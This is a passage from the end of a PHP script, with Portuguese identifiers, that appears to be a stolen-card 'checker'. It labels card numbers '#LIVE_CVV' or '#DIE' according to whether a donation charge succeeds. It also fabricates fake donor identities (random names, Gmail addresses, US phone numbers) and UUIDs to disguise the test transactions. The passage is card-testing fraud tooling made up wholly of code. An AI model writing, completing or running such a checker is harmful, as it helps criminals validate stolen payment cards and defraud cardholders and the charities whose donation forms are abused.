        return "#LIVE_CVV ↝ [{$cartao_formatado}] ↝ [ CVV Válido mas Donate Falhou ] - ( {$tempo}s) | cyber";
    }
    
    // Fallback
    return "#DIE ↝ [{$cartao_formatado}] ↝ [ Transação Negada ] - ( {$tempo}s) | cyber";
}

function gerar_doador() {
    $nomes = ['John', 'James', 'Robert', 'Michael', 'William', 'David', 'Christopher', 'Daniel', 'Matthew', 'Andrew'];
    $sobrenomes = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez'];
    
    $primeiro = $nomes[array_rand($nomes)];
    $ultimo = $sobrenomes[array_rand($sobrenomes)];
    $email = strtolower($primeiro . '.' . $ultimo . rand(1000, 9999) . '@gmail.com');
    
    return [
        'first_name' => $primeiro,
        'last_name' => $ultimo,
        'email' => $email,
        'phone' => '+1 ' . rand(200, 999) . ' ' . rand(200, 999) . '-' . rand(1000, 9999)
    ];
}

function gerar_uuid() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

?>
